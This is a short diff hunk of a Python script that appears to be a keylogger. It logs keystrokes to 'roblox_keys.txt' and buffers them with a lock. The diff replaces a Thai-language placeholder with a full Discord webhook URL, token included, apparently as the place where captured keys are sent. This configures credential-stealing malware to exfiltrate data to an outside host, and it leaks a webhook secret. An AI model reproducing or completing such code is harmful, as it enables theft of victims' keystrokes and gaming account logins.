@@ -5,7 +5,7 @@ import requests
 import threading
 
 logfile = "roblox_keys.txt"
-WEBHOOK_URL = "ใส่ URL Discord Webhook ของคุณที่นี่"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1402834224481833041/K9q5saSpYNlIU7UeK11C8Ls0P3AgbCh8LvcqKzNOsHFjjWgsTF8wRf0UeJU_qjK5t5Yv"
 
 buffer = ""
 lock = threading.Lock()
